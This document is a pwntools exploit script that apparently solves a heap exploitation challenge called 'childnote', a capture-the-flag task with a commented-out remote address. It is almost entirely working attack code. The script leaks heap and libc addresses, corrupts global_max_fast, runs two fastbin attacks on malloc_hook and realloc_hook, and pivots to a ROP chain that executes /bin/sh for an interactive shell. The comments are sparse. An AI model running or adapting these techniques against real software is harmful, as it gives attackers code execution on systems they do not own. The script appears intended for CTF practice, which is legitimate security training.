#!/usr/bin/python3
from pwn import *

global_max_fast = 0x1eeb80

def create(size,data):
    r.sendlineafter(' >','1')
    r.sendlineafter('size : ',str(size))
    r.sendafter('Content : ',data)

def superCreate(size):
    r.sendlineafter(' >','1')
    r.sendlineafter('size : ',size)

def show(idx):
    r.sendlineafter(' >','2')
    r.sendlineafter('index : ', str(idx))
    return r.recvuntil('\n=======',drop=True)

def edit(idx,data):
    r.sendlineafter(' >','3')
    r.sendlineafter('index : ',str(idx))
    r.sendafter('Content : ',data)

def delete(idx):
    r.sendlineafter(' >','4')
    r.sendlineafter('index : ',str(idx))



r = process('./childnote')
#r = remote('140.112.31.97',30204)
for i in range(9):      #0 1 2 3 4 5 6 7 8
    create(0xf0,str(i)*0x10)
for i in range(0,6):  #tcache填滿
    delete(i)           #delete 0 1 2 3 4 5 
delete(8)


# leak heap base
heap_base = u64(show(1)+b'\x00\x00') - 0x10
print("heap_base: ",hex(heap_base) )



chunkA = heap_base + 0x890       #6
#print(hex(chunkA))
edit(6,p64(chunkA+0x20) + p64(0x12345678) + p64(0xe1) + p64(chunkA) + p64(chunkA+0x8) + b'A'*0xc0 + p64(0xe0)) #A
delete(7) #一塊 1e0 大小的進到 unsorted bin


create(0xf0,'9'*0x10)  #9 @0x8b0 從 unsorted bin 拿 0x100 出來，此時 unsorted bin 剩下 0xe0

create(0xf0,'10') #10 0xb90 在 top chunk 後面

#leak libc_base
for i in range(8):
    edit(6,b'A'*0x10 + p64(0x121) + p64(0x1000))
    edit(9,b'A'*0x110 + p64(0x21) + b'A'*0x18 + p64(0x21))
    delete(9)

libc_base = u64(show(9)+b'\x00\x00') - 0x1ebbe0
print('libc_base: ',hex(libc_base))
#######################################################################################
edit(6,p64(0)+p64(0)+p64(0xf1)+p64(0x1000)) #f1 可以亂填沒有用
for i in range(6):
    edit(9,b'A'*0x1d0+p64(0xe1) + b'A'*0xd8 + p64(0x21) + b'A'*0x18 + p64(0x21))
    delete(8) # 0xa90


#small bin offset = fastbin + 0x100(fast bin) + 0x10 + 0x20(unsorted bin) 
edit(9,b'G'*0xf0 + p64(0xe1) + p64(libc_base+0x1ebcb0) + p64(heap_base+0x8b0)) #讓 chunkG 指到smallbin smallbin_offset = 0x1ebcb0
edit(6,b'F'*0x10+p64(0xe0) + p64(heap_base+0x9b0) + p64(libc_base+global_max_fast-0x10)) #改trampoline # fd:chunkG = heap_base+0x9b0 bk:target-0x10

create(0xd0,'11') #11 unlink @0x9b0





edit(6,b'A'*0x10 + p64(0xf1) + p64(0x1000))
## fast bin attack
for i in range(8):
    edit(9,b'A'*0x2d0 + p64(0xf1)+ b'A'*0xe8 + p64(0x21) + b'A'*0x18 + p64(0x21)) # #9+0x2d0 in 10
    delete(10)

edit(9,b'A'*0xe0 + p64(0x21) + b'A'*0x18 + p64(0x21)) 
delete(9) #put #9 to fast bin
malloc_hook = 0x1ebb70

edit(6,b'A'*0x10+p64(0xf1)+p64(libc_base+malloc_hook-0x179)) #why 179 #find 0xffffffff in gdb

create(0xe0,'12') #fast bin attack
create(0xe0,'13')

## 2nd fast bin attack
edit(6,b'A'*0x10 + p64(0xf1) + p64(0x1000))
edit(9,b'A'*0x2d0 + p64(0xf1)+ b'A'*0xe8 + p64(0x21) + b'A'*0x18 + p64(0x21))
delete(10)

edit(9,b'A'*0xe0 + p64(0x21) + b'A'*0x18 + p64(0x21))
delete(9)

edit(6,b'A'*0x10 + p64(0xf1) + p64(libc_base+malloc_hook-0x161)) #why 161 #find 0xffffffff in gdb

create(0xe0,'14')
create(0xe0,'15') #overlap 15 13

pop_rsp_ret = 0x32b5a
libc_reallocp6 = 0x9e006
pop_rax = 0x4a550
pop_rdi = 0x26b72
pop_rsi = 0x27529
pop_rdx = 0x162866
syscall = 0x66229
bin_sh = 0x1b75aa

edit(13,b'A'*0x8+p64(0xf1)+p64(0x1000))
input()
edit(15,b'A'*0x141+p64(libc_base+pop_rsp_ret)+p64(libc_base+libc_reallocp6))
#########################realloc_hook#################malloc_hook##########

#create ROP chain  59	sys_execve
ROPchain = p64(libc_base+pop_rax) + p64(59) +\
           p64(libc_base+pop_rdi) + p64(libc_base+bin_sh) + \
           p64(libc_base+pop_rsi) + p64(0) + \
           p64(libc_base+pop_rdx) + p64(0) + p64(0)+\
           p64(libc_base+syscall)


edit(6,b'A'*0x10 + p64(0xf1) + p64(0x1000))
edit(9,ROPchain)

superCreate(b'240abcdefghijklm'+p64(heap_base+0x8c8)) # #9 @0x8b0 + 0x18

r.interactive()


